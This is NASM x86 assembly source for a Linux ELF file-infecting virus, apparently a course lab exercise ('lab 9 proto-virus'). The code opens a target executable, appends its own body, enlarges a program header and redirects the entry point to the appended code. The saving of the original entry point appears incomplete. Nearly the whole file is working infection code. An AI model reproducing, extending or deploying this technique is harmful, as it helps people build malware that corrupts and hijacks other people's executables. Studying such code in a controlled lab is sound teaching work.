%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define ELFHDR_size 52
%define ELFHDR_phoff	28

%define BUFF_SIZE 64
%define ELF_MAGIC 0x464C457F
	
	global _start

	section .text
_start:	
	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	;CODE START
	call get_my_loc             ; getting the correct location of next_i
	mov eax, ecx
    sub eax, next_i - msg       ; getting the correct location of msg-the address difference between “next_i” and "msg" is constant even if the code changes position
    write 1,eax,len             ; writing to STDOUT "This is a virus"
	
	call get_my_loc             ; getting the correct location of next_i
    sub ecx, next_i - FileName  ; getting the location of FileName
	mov eax, ecx
    open eax, RDWR, 0777        ; opening file "ELFexec" to read & write with all permissions
	cmp eax, -1					; checking if open was succesful
	je _file_error				
	mov esi, eax				; esi = fd
	lea ebx, [ebp-BUFF_SIZE]		
	read eax, ebx, ELFHDR_size	;read first 4 bytes
	cmp dword[ebp-BUFF_SIZE], ELF_MAGIC		; check if file is elf
	jne	_error_not_elf
	write 1, OutStr, Failstr - OutStr

	;attaching virus to file
	lseek esi, 0, SEEK_SET
	lseek esi, 0, SEEK_END
	mov edi, eax 			;saving file size
	write esi, _start, virus_end - _start

	;reading program headers
	lseek esi, [ebp-BUFF_SIZE+PHDR_start], SEEK_SET
	lea ecx, [ebp- 2 * BUFF_SIZE], ;place to read phdrs to
	read esi, ecx, 2 * PHDR_size

	;changing size of second PHDR
	mov eax, virus_end - _start ; eax = virus size
	add eax, edi				; eax += original file size
	sub eax, [ebp - 2*BUFF_SIZE + PHDR_offset]	;eax -= second phdr offset
	mov [ebp-2*BUFF_SIZE+PHDR_size+PHDR_memsize], eax	;second phdr memsize = eax
	mov [ebp-2*BUFF_SIZE+PHDR_size+PHDR_filesize], eax  ;second phdr filesize = eax

	;rewriting phdrs to elf file
	lseek esi, [ebp - BUFF_SIZE+PHDR_start], SEEK_SET
	lea ecx, [ebp - BUFF_SIZE * 2]
	write esi, ecx, 2*PHDR_size

	;changing entry point
	lseek esi, 0 , SEEK_SET
	mov ecx, [ebp-2*BUFF_SIZE+PHDR_size+PHDR_vaddr]	;ecx = 2nd phdr vaddr
	add ecx, edi									; ecx += original file size
	sub ecx, [ebp-2*BUFF_SIZE+PHDR_size+PHDR_offset]; ecx -= 2phdr offset
	mov [ebp - BUFF_SIZE + ENTRY], ecx				; changing entry point
	lea ecx, [ebp-BUFF_SIZE]
    write esi, ecx, ELFHDR_size	

	; attaching old entry point					
	lseek esi, 0,SEEK_SET
	lseek esi, -4, SEEK_END
	lea ebx, [ebp-4]	;ebx = old entry point
	write esi, ebx, 4	;attach old entri point to end of file
	close esi
	jmp VirusExit
	exit 0


	;jmp VirusExit

	_error_not_elf:
	write 1, Failstr, get_my_loc - Failstr 
	jmp VirusExit
	_file_error:
	jmp VirusExit

VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
	
msg: db "This is a virus",10,0
len equ $ - msg

get_my_loc:
	call next_i
next_i:
	pop ecx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:


